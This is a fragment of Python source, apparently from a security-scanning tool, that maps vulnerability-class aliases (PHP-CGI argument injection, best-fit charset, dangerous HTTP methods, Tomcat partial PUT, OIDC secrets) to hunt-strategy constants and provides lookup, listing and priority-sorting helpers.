    "rabbitmq_secret": RABBITMQ_OAUTH_STRATEGY,
    "onelogin_oidc": ONELOGIN_OIDC_STRATEGY,
    "onelogin": ONELOGIN_OIDC_STRATEGY,
    "oidc_secret": ONELOGIN_OIDC_STRATEGY,
    "best_fit_charset": BEST_FIT_CHARSET_STRATEGY,
    "worstfit": BEST_FIT_CHARSET_STRATEGY,
    "php_cgi": BEST_FIT_CHARSET_STRATEGY,
    "php_cgi_argument_injection": BEST_FIT_CHARSET_STRATEGY,
    "dangerous_http_methods": DANGEROUS_HTTP_METHODS_STRATEGY,
    "dangerous_methods": DANGEROUS_HTTP_METHODS_STRATEGY,
    "http_methods": DANGEROUS_HTTP_METHODS_STRATEGY,
    "tomcat_partial_put": DANGEROUS_HTTP_METHODS_STRATEGY,
    "partial_put": DANGEROUS_HTTP_METHODS_STRATEGY,
}


def get_strategy(vuln_class: str) -> Optional[HuntStrategy]:
    """Get a hunt strategy by vulnerability class."""
    return STRATEGY_REGISTRY.get(vuln_class.lower())


def list_strategies() -> List[Dict[str, Any]]:
    """List all available hunt strategies."""
    return [s.to_dict() for s in STRATEGY_REGISTRY.values()]


def get_priority_ordered() -> List[HuntStrategy]:
    """Get strategies ordered by priority (0=highest)."""
    return sorted(STRATEGY_REGISTRY.values(), key=lambda s: s.priority)
